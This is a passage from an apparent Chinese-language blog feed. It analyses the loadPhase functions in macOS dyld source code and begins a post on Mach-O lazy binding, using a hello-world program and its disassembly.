image = loadPhase2(path, orgPath, context, sEnv.DYLD_FALLBACK_FRAMEWORK_PATH, fallbackLibraryPaths, exceptions);</span><br><span class="line">		<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">			<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-4_loadPhase2,loadPhase3，loadPhase4">2.4 loadPhase2,loadPhase3，loadPhase4</h2><p>这两个函数纯粹的实现了路径修改的逻辑，通过不同的方式去生成最终的加载路径，逻辑与<code>loadPhase0</code>基本类似，有兴趣可以自行查看代码。</p>
<p><a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2933" target="_blank" rel="external">LoadPhase2</a></p>
<p><a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2820" target="_blank" rel="external">LoadPhase3</a></p>
<p><a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2797" target="_blank" rel="external">LoadPhase4</a></p>
<h2 id="2-5_loadPhase5">2.5 loadPhase5</h2><p><code>loadPhase5</code>根据参数<code>exceptions</code>的不同形成了两个不同的分支。</p>
<ul>
<li>loadPhase5load：通过读取文件，加载文件到内存中，实例化<code>ImageLoader</code>。</li>
<li>loadPhase5check: 通过遍历已经加载的<code>ImageLoader</code>的容器，获取已经加载的<code>ImageLoader</code>。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// open or check existing</span></span><br><span class="line"><span class="comment">// 检测是否有覆盖的，修正path，最后调用loadPhase5Load或者check</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase5</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// check for specific dylib overrides</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;DylibOverride&gt;::iterator it = sDylibOverrides.begin(); it != sDylibOverrides.end(); ++it) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="built_in">strcmp</span>(it-&gt;installName, path) == <span class="number">0</span> ) &#123;</span><br><span class="line">			path = it-&gt;override;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( exceptions != <span class="literal">NULL</span> ) </span><br><span class="line">		<span class="keyword">return</span> loadPhase5load(path, orgPath, context, exceptions);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> loadPhase5check(path, orgPath, context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>loadPhase5check</code>的逻辑非常简单，就是遍历容器，取出相同名字的imageLoader对象。有兴趣的可以自己查看<a href="https://github.com/turingH/dyld_soucecode_analysis/blob/master/src/dyld.cpp#L2729" target="_blank" rel="external">loadPhase5check</a>。</p>
<h2 id="2-6_loadPhase5load">2.6 loadPhase5load</h2><p>这里是真正的加载逻辑</p>
<ul>
<li>防止Image改名，在Image的容器里面遍历，检查是否已经加载</li>
<li>在<code>SharedCache</code>寻找是否存在Image的缓存，如果存在的使用<code>ImageLoaderMachO::instantiateFromCache</code>来实例化<code>ImageLoader</code>。</li>
<li>如果上面两个都没有找到的话，就通过<code>loadPhase5open</code>打开文件，并读取到内存。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase5load</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	ImageLoader* image = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// just return NULL if file not found, but record any other errors</span></span><br><span class="line">	<span class="keyword">struct</span> stat stat_buf;</span><br><span class="line">	<span class="keyword">if</span> ( my_stat(path, &amp;stat_buf) == -<span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = errno;</span><br><span class="line">		<span class="keyword">if</span> ( err != ENOENT ) &#123;</span><br><span class="line">			exceptions-&gt;push_back(dyld::mkstringf(<span class="string">"%s: stat() failed with errno=%d"</span>, path, err));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// in case image was renamed or found via symlinks, check for inode match</span></span><br><span class="line">	image = findLoadedImage(stat_buf);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// do nothing if not already loaded and if RTLD_NOLOAD or NSADDIMAGE_OPTION_RETURN_ONLY_IF_LOADED</span></span><br><span class="line">	<span class="comment">//RTLD_NOLOAD或者NSADDIMAGE_OPTION_RETURN_ONLY_IF_LOADED字段设置了则不进行加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.dontLoad )</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> DYLD_SHARED_CACHE_SUPPORT</span></span><br><span class="line">	<span class="comment">// see if this image is in shared cache</span></span><br><span class="line">	<span class="keyword">const</span> macho_header* mhInCache;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>*			pathInCache;</span><br><span class="line">	<span class="keyword">long</span>				slideInCache;</span><br><span class="line">	<span class="comment">// 如果在sharedCacheImage中找到了，则通过cache来加载</span></span><br><span class="line">	<span class="keyword">if</span> ( findInSharedCacheImage(path, <span class="literal">false</span>, &amp;stat_buf, &amp;mhInCache, &amp;pathInCache, &amp;slideInCache) ) &#123;</span><br><span class="line">		image = ImageLoaderMachO::instantiateFromCache(mhInCache, pathInCache, slideInCache, stat_buf, gLinkContext);</span><br><span class="line">		<span class="keyword">return</span> checkandAddImage(image, context);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// file exists and is not in dyld shared cache, so open it</span></span><br><span class="line">	<span class="comment">// shared_cache中不存在image，则通过LoadPhase5open来加载image</span></span><br><span class="line">	<span class="keyword">return</span> loadPhase5open(path, context, stat_buf, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-7_loadPhase5open与loadPhase6">2.7  loadPhase5open与loadPhase6</h2><p><code>loadPhase5open</code>只是一个简单的封装。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//根据路径打开文件</span></span><br><span class="line"><span class="comment">//调用loadPhase6</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase5open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LoadContext&amp; context, <span class="keyword">const</span> <span class="keyword">struct</span> stat&amp; stat_buf, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// open file (automagically closed when this function exits)</span></span><br><span class="line">	<span class="function">FileOpener <span class="title">file</span><span class="params">(path)</span></span>;</span><br><span class="line">		</span><br><span class="line">	<span class="comment">// just return NULL if file not found, but record any other errors</span></span><br><span class="line">	<span class="keyword">if</span> ( file.getFileDescriptor() == -<span class="number">1</span> ) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = errno;</span><br><span class="line">		<span class="keyword">if</span> ( err != ENOENT ) &#123;</span><br><span class="line">			<span class="keyword">const</span> <span class="keyword">char</span>* newMsg = dyld::mkstringf(<span class="string">"%s: open() failed with errno=%d"</span>, path, err);</span><br><span class="line">			exceptions-&gt;push_back(newMsg);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> loadPhase6(file.getFileDescriptor(), stat_buf, path, context);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (<span class="keyword">const</span> <span class="keyword">char</span>* msg) &#123;</span><br><span class="line">		<span class="keyword">const</span> <span class="keyword">char</span>* newMsg = dyld::mkstringf(<span class="string">"%s: %s"</span>, path, msg);</span><br><span class="line">		exceptions-&gt;push_back(newMsg);</span><br><span class="line">		<span class="built_in">free</span>((<span class="keyword">void</span>*)msg);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>做了错误提示之后，调用了<code>loadPhase6</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase6</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">struct</span> stat&amp; stat_buf, <span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LoadContext&amp; context)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s)\n", __func__ , path);</span></span><br><span class="line">	<span class="keyword">uint64_t</span> fileOffset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">uint64_t</span> fileLength = stat_buf.st_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// validate it is a file (not directory)</span></span><br><span class="line">	<span class="keyword">if</span> ( (stat_buf.st_mode &amp; S_IFMT) != S_IFREG ) </span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"not a file"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span> firstPage[<span class="number">4096</span>];</span><br><span class="line">	<span class="keyword">bool</span> shortPage = <span class="literal">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// min mach-o file is 4K</span></span><br><span class="line">	<span class="keyword">if</span> ( fileLength &lt; <span class="number">4096</span> ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( pread(fd, firstPage, fileLength, <span class="number">0</span>) != (<span class="keyword">ssize_t</span>)fileLength )</span><br><span class="line">			throwf(<span class="string">"pread of short file failed: %d"</span>, errno);</span><br><span class="line">		shortPage = <span class="literal">true</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( pread(fd, firstPage, <span class="number">4096</span>,<span class="number">0</span>) != <span class="number">4096</span> )</span><br><span class="line">			throwf(<span class="string">"pread of first 4K failed: %d"</span>, errno);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// if fat wrapper, find usable sub-file</span></span><br><span class="line">	<span class="comment">// 如果是一个fat格式的文件，找到对应的子文件</span></span><br><span class="line">	<span class="comment">// 从fat文件中找到对应子文件的代码。</span></span><br><span class="line">	<span class="keyword">const</span> fat_header* fileStartAsFat = (fat_header*)firstPage;</span><br><span class="line">	<span class="keyword">if</span> ( fileStartAsFat-&gt;magic == OSSwapBigToHostInt32(FAT_MAGIC) ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( fatFindBest(fileStartAsFat, &amp;fileOffset, &amp;fileLength) ) &#123;</span><br><span class="line">			<span class="keyword">if</span> ( (fileOffset+fileLength) &gt; (<span class="keyword">uint64_t</span>)(stat_buf.st_size) )</span><br><span class="line">				throwf(<span class="string">"truncated fat file.  file length=%llu, but needed slice goes to %llu"</span>, stat_buf.st_size, fileOffset+fileLength);</span><br><span class="line">			<span class="keyword">if</span> (pread(fd, firstPage, <span class="number">4096</span>, fileOffset) != <span class="number">4096</span>)</span><br><span class="line">				throwf(<span class="string">"pread of fat file failed: %d"</span>, errno);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="string">"no matching architecture in universal wrapper"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try mach-o loader</span></span><br><span class="line">	<span class="keyword">if</span> ( shortPage ) </span><br><span class="line">		<span class="keyword">throw</span> <span class="string">"file too short"</span>;</span><br><span class="line">	<span class="comment">// 检测运行平台是否正确</span></span><br><span class="line">	<span class="keyword">if</span> ( isCompatibleMachO(firstPage, path) ) &#123;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">// only MH_BUNDLE, MH_DYLIB, and some MH_EXECUTE can be dynamically loaded</span></span><br><span class="line">		<span class="comment">// 只有MH_EXECUTE，MH_DYLIB，MH_BUNDLE三种文件才可被动态加载</span></span><br><span class="line">		<span class="keyword">switch</span> ( ((mach_header*)firstPage)-&gt;filetype ) &#123;</span><br><span class="line">			<span class="keyword">case</span> MH_EXECUTE:</span><br><span class="line">			<span class="keyword">case</span> MH_DYLIB:</span><br><span class="line">			<span class="keyword">case</span> MH_BUNDLE:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">throw</span> <span class="string">"mach-o, but wrong filetype"</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> TARGET_IPHONE_SIMULATOR	</span></span><br><span class="line">	<span class="preprocessor">#<span class="keyword">if</span> TARGET_OS_WATCH || TARGET_OS_TV</span></span><br><span class="line">		<span class="comment">// disable error during bring up of these simulators</span></span><br><span class="line">	<span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="comment">// &lt;rdar://problem/14168872&gt; dyld_sim should restrict loading osx binaries</span></span><br><span class="line">		<span class="keyword">if</span> ( !isSimulatorBinary(firstPage, path) ) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="string">"mach-o, but not built for iOS simulator"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// instantiate an image</span></span><br><span class="line">		ImageLoader* image = ImageLoaderMachO::instantiateFromFile(path, fd, firstPage, fileOffset, fileLength, stat_buf, gLinkContext);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// validate</span></span><br><span class="line">		<span class="keyword">return</span> checkandAddImage(image, context);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try other file formats here...</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// throw error about what was found</span></span><br><span class="line">	<span class="keyword">switch</span> (*(<span class="keyword">uint32_t</span>*)firstPage) &#123;</span><br><span class="line">		<span class="keyword">case</span> MH_MAGIC:</span><br><span class="line">		<span class="keyword">case</span> MH_CIGAM:</span><br><span class="line">		<span class="keyword">case</span> MH_MAGIC_64:</span><br><span class="line">		<span class="keyword">case</span> MH_CIGAM_64:</span><br><span class="line">			<span class="keyword">throw</span> <span class="string">"mach-o, but wrong architecture"</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		throwf(<span class="string">"unknown file type, first eight bytes: 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X"</span>, </span><br><span class="line">			firstPage[<span class="number">0</span>], firstPage[<span class="number">1</span>], firstPage[<span class="number">2</span>], firstPage[<span class="number">3</span>], firstPage[<span class="number">4</span>], firstPage[<span class="number">5</span>], firstPage[<span class="number">6</span>],firstPage[<span class="number">7</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>做了Fat格式的检测，子类型文件提取。</li>
<li>检测Mach-O类型，只有<code>MH_EXECUTE</code>，<code>MH_DYLIB</code>，<code>MH_BUNDLE</code>三种文件才可被动态加载。</li>
<li>通过<code>ImageLoaderMachO::instantiateFromFile</code>生成<code>ImageLoader</code>的实例。</li>
</ul>
<h1 id="0x03_小结">0x03 小结</h1><p><code>Load</code>的函数调用流程就是一系列的loadPhase*函数的调用，在<code>load</code>最后都会通过ImageLoader的构造函数，实例化ImageLoader，接下来 就需要分析ImageLoader的几个不同的构造函数。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在<code>OS X</code>或者<code>IOS</code>上运行一个程序时，dyld除了需要加载主要的执行程序之外，还需要加载需要的库文件以及库文件依赖的库文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// instantiate ImageLoader for main executable</span></span><br><span class="line">sMainExecutable = instantiateFromLoadedImage(mainExecutableMH, mainExecutableSlide, sExecPath);<span class="comment">//加载MACHO到image</span></span><br></pre></td></tr></table></figure>
<p>这一条函数调用加载了需要运行的程序，具体详细分析可以参考<a href="http://BLOGIMAGE/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">dyld中mach-o文件加载的简单分析</a>。</p>
<p>而在<code>link</code>主程序之前还会动态的加载一些其他的库文件。例如<code>DYLD_INSERT_LIBRARIES</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// load any inserted libraries</span></span><br><span class="line"><span class="comment">// 类似于linux里面的LD_PRELOAD</span></span><br><span class="line"><span class="keyword">if</span>	( sEnv.DYLD_INSERT_LIBRARIES != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* lib = sEnv.DYLD_INSERT_LIBRARIES; *lib != <span class="literal">NULL</span>; ++lib) </span><br><span class="line">		loadInsertedDylib(*lib); <span class="comment">//!!!动态加载dylib</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// record count of inserted libraries so that a flat search will look at </span></span><br><span class="line"><span class="comment">// inserted libraries, then main, then others.</span></span><br><span class="line">sInsertedDylibCount = sAllImages.size()-<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><code>loadInsertedDylib</code>的实现其实就是简单的调用<code>load</code>函数。通过简单的分析<code>load</code>函数，增强对dyld工作流程的理解。</p>]]>
    
    </summary>
    
      <category term="dlopen" scheme="http://yoursite.com/tags/dlopen/"/>
    
      <category term="dyld" scheme="http://yoursite.com/tags/dyld/"/>
    
      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
    
      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Mach-O的动态链接相关知识]]></title>
    <link href="http://yoursite.com/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/"/>
    <id>http://yoursite.com/2016/03/10/Mach-O的动态链接/</id>
    <published>2016-03-10T16:40:02.000Z</published>
    <updated>2016-03-24T03:37:40.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>通过分析<code>Mach-O</code>的动态链接过程，加深对<code>Mach-O</code>文件结构的理解。对Mach-O文件格式的简单的分析看这里<a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/" target="_blank" rel="external">这里</a>。</p>
<a id="more"></a>
<h1 id="0x01_Mach-O_Lazy_Bind">0x01 Mach-O Lazy Bind</h1><p>Mach-O文件的通过dyld加载的时候并没有确定每一个函数的具体地址在哪里，而是在真正调用该函数的时候通过<strong>过程连接表</strong>(procedure linkage table)，后面简称PLT，来进行一次<strong>lazybind</strong>。</p>
<p>结合Mach-O文件的分析与代码的调试简单的分析一下，只能算是管中窥豹了。</p>
<p>源码很简单。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="comment">// insert code here...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello, World!\n"</span>);</span><br><span class="line">  	<span class="built_in">printf</span>(<span class="string">"2Hello, World!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分别在两个printf函数处下断点，启动程序。</p>
<h2 id="1-1_第一次调用prinf">1.1 第一次调用prinf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lazy_bind`main:</span><br><span class="line">    <span class="number">0x100000f10</span> &lt;+<span class="number">0</span>&gt;:  pushq  %rbp</span><br><span class="line">    <span class="number">0x100000f11</span> &lt;+<span class="number">1</span>&gt;:  movq   %rsp, %rbp</span><br><span class="line">    <span class="number">0x100000f14</span> &lt;+<span class="number">4</span>&gt;:  subq   $<span class="number">0x20</span>, %rsp</span><br><span class="line">    <span class="number">0x100000f18</span> &lt;+<span class="number">8</span>&gt;:  leaq   <span class="number">0x57</span>(%rip), %rax          ; <span class="string">"Hello, World!\n"</span></span><br><span class="line">    <span class="number">0x100000f1f</span> &lt;+<span class="number">15</span>&gt;: movl   $<span class="number">0x0</span>, -<span class="number">0x4</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f26</span> &lt;+<span class="number">22</span>&gt;: movl   %edi, -<span class="number">0x8</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f29</span> &lt;+<span class="number">25</span>&gt;: movq   %rsi, -<span class="number">0x10</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f2d</span> &lt;+<span class="number">29</span>&gt;: movq   %rax, %rdi</span><br><span class="line">    <span class="number">0x100000f30</span> &lt;+<span class="number">32</span>&gt;: movb   $<span class="number">0x0</span>, %al</span><br><span class="line">-&gt;  <span class="number">0x100000f32</span> &lt;+<span class="number">34</span>&gt;: callq  <span class="number">0x100000f56</span>               ; symbol stub <span class="keyword">for</span>: <span class="built_in">printf</span></span><br><span class="line">    <span class="number">0x100000f37</span> &lt;+<span class="number">39</span>&gt;: leaq   <span class="number">0x47</span>(%rip), %rdi          ; <span class="string">"2Hello, World!\n"</span></span><br><span class="line">    <span class="number">0x100000f3e</span> &lt;+<span class="number">46</span>&gt;: movl   %eax, -<span class="number">0x14</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f41</span> &lt;+<span class="number">49</span>&gt;: movb   $<span class="number">0x0</span>, %al</span><br><span class="line">    <span class="number">0x100000f43</span> &lt;+<span class="number">51</span>&gt;: callq  <span class="number">0x100000f56</span>               ; symbol stub <span class="keyword">for</span>: <span class="built_in">printf</span></span><br><span class="line">    <span class="number">0x100000f48</span> &lt;+<span class="number">56</span>&gt;: xorl   %ecx, %ecx</span><br><span class="line">    <span class="number">0x100000f4a</span> &lt;+<span class="number">58</span>&gt;: movl   %eax, -<span class="number">0x18</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f4d</span> &lt;+<span class="number">61</span>&gt;: movl   %ecx, %eax</span><br><span class="line">    <span class="number">0x100000f4f</span> &lt;+<span class="number">63</span>&gt;: addq   $<span class="number">0x20</span>, %rsp</span><br><span class="line">    <span class="number">0x100000f53</span> &lt;+<span class="number">67</span>&gt;: popq   %rbp</span><br><span class="line">    <span class="number">0x100000f54</span> &lt;+<span class="number">68</span>&gt;: 